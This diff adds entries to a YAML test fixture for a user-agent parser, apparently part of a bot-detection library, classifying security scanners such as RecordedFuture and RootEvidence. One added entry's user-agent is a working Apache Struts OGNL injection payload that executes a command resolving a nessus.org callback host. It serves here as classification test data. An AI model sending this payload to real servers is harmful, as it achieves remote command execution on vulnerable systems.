@@ -342,6 +342,44 @@
     manufacturer: unknown
 -
   headers:
+    user-agent: 'RecordedFuture Global Inventory Crawler'
+  device:
+    architecture: null
+    deviceName: null
+    marketingName: null
+    manufacturer: unknown
+    brand: unknown
+    dualOrientation: null
+    simCount: 0
+    display:
+      width: null
+      height: null
+      touch: false
+      size: null
+    type: unknown
+    ismobile: false
+    istv: false
+    bits: null
+  os:
+    name: null
+    marketingName: null
+    version: null
+    manufacturer: unknown
+    bits: null
+  client:
+    name: RecordedFuture
+    modus: null
+    version: null
+    manufacturer: unknown
+    type: security-checker
+    isbot: true
+    bits: null
+  engine:
+    name: null
+    version: null
+    manufacturer: unknown
+-
+  headers:
     user-agent: 'Observer/1.0 (+https://obsrvr.net/about; crawler@obsrvr.net)'
   device:
     architecture: null
@@ -482,6 +520,44 @@
     bits: null
   client:
     name: SecurityScanner
+    modus: null
+    version: 1.0.0
+    manufacturer: unknown
+    type: security-checker
+    isbot: true
+    bits: null
+  engine:
+    name: null
+    version: null
+    manufacturer: unknown
+-
+  headers:
+    user-agent: RootEvidence/1.0
+  device:
+    architecture: null
+    deviceName: null
+    marketingName: null
+    manufacturer: unknown
+    brand: unknown
+    dualOrientation: null
+    simCount: 0
+    display:
+      width: null
+      height: null
+      touch: false
+      size: null
+    type: unknown
+    ismobile: false
+    istv: false
+    bits: null
+  os:
+    name: null
+    marketingName: null
+    version: null
+    manufacturer: unknown
+    bits: null
+  client:
+    name: RootEvidence
     modus: null
     version: 1.0.0
     manufacturer: unknown
@@ -902,6 +978,44 @@
     name: InfoGuardDisclosureResearch
     modus: null
     version: 1.0.0
+    manufacturer: unknown
+    type: security-checker
+    isbot: true
+    bits: null
+  engine:
+    name: null
+    version: null
+    manufacturer: unknown
+-
+  headers:
+    user-agent: "(#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) + (#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) + (#request.map2=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) + (#request.map2.setBean(#request.get('map').get('context')) == true).toString().substring(0,0) + (#request.map3=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) + (#request.map3.setBean(#request.get('map2').get('memberAccess')) == true).toString().substring(0,0) + (#request.get('map3').put('excludedPackageNames',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) + (#request.get('map3').put('excludedClasses',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) + (#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'getent ahosts whuqnjfnugcvtg5so52xhj2kx24pwcpxawwmn2faak3nm6jxu2wa.was.nessus.org'}))"
+  device:
+    architecture: null
+    deviceName: null
+    marketingName: null
+    manufacturer: unknown
+    brand: unknown
+    dualOrientation: null
+    simCount: 0
+    display:
+      width: null
+      height: null
+      touch: false
+      size: null
+    type: unknown
+    ismobile: false
+    istv: false
+    bits: null
+  os:
+    name: null
+    marketingName: null
+    version: null
+    manufacturer: unknown
+    bits: null
+  client:
+    name: nmap
+    modus: null
+    version: null
     manufacturer: unknown
     type: security-checker
     isbot: true
